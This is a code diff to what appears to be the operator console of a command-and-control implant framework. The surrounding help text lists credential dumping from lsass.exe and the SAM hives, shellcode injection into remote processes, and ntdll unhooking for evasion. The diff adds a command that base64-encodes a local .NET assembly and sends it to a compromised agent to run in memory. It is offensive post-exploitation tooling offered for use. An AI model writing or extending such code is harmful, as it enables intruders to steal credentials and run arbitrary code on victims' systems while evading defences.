@@ -168,6 +168,8 @@ def print_agent_help():
     lsass <method>                         ->  dump lsass.exe [methods:  direct,comsvcs] (elevation required)
     sam                                    ->  dump sam,security,system hives using reg.exe (elevation required)
     shellc <raw-shellcode-file> <pid>      ->  inject shellcode to remote process
+    assembly <local-assembly> <args>       ->  execute .net assembly (pass all args as a single string using quotes)
+                                               warning: make sure the assembly doesn't call any exit function
     
     --== Evasion Stuff ==--
     unhook                                 ->  unhook ntdll.dll
@@ -319,6 +321,21 @@ def agent_screen(agent_id):
                     "command_type": "shellc",
                     "shellc_base64": shellc_base64,
                     "pid": pid
+                }
+
+            elif re.fullmatch(r"\s*assembly .+", command):
+                args = re.sub(r"\s*assembly\s+", "", command, 1)
+                assembly_file = shlex.split(args)[0]
+                assembly_args = shlex.split(args)[1]
+                assembly = utils.read_file(assembly_file)
+                if not assembly:
+                    continue
+                else:
+                    assembly_base64 = utils.encode_base_64(assembly, encoding="utf-8")
+                command_dict = {
+                    "command_type": "assembly",
+                    "assembly_base64": assembly_base64,
+                    "assembly_args": assembly_args
                 }
 
             elif re.fullmatch(r"\s*unhook\s*", command):
